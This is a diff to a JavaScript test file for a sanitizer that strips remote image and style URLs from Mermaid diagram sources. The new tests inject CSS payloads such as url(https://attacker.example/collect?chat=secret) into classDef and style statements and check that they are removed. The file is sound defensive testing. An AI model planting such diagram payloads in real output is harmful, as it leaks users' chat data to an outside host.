@@ -53,6 +53,8 @@ const ORDINARY = [
   'sequenceDiagram\n  participant Alice\n  properties Alice: {"class": "internal-service-actor-box"}\n  Alice->>Bob: hi',
   "gantt\n  title Plan\n  dateFormat YYYY-MM-DD\n  section A\n  Task 1 :a1, 2024-01-01, 30d",
   "pie title Pets\n  \"Dogs\" : 386\n  \"Cats\" : 85",
+  "flowchart LR; A[Start]-->B[End]; style A fill:#f96; style B fill:#bbf",
+  "stateDiagram-v2\n  A --> B; classDef x fill:#f96\n  class A x",
 ];
 
 for (const source of ORDINARY) {
@@ -66,6 +68,20 @@ test("the remote image key is dropped and the rest of the node kept", () => {
     stripRemoteDiagramImages('flowchart LR\n  A@{ img: "https://attacker.example/c", label: "Hi", w: 1 }'),
     'flowchart LR\n  A@{ "label":"Hi","w":1 }',
   );
+});
+
+test("a style statement after a semicolon cannot fetch either", () => {
+  const url = "url(https://attacker.example/collect?chat=secret)";
+  for (const [source, kept] of [
+    [`stateDiagram-v2\n  A --> B; classDef x fill:${url}\n  class A x`, "stateDiagram-v2\n  A --> B;\n  class A x"],
+    // A stateDiagram classDef runs to the end of the line, past any `;`.
+    [`stateDiagram-v2\n  classDef x fill:#f96;background:${url}\n  class A x`, "stateDiagram-v2\n\n  class A x"],
+    [`flowchart LR; A-->B; style A fill:${url}`, "flowchart LR; A-->B;"],
+  ]) {
+    const out = stripRemoteDiagramImages(source);
+    assert.equal(out, kept);
+    assert.equal(stripRemoteDiagramImages(out), out);
+  }
 });
 
 test("every surface that draws a diagram uses the guarded plugin", () => {
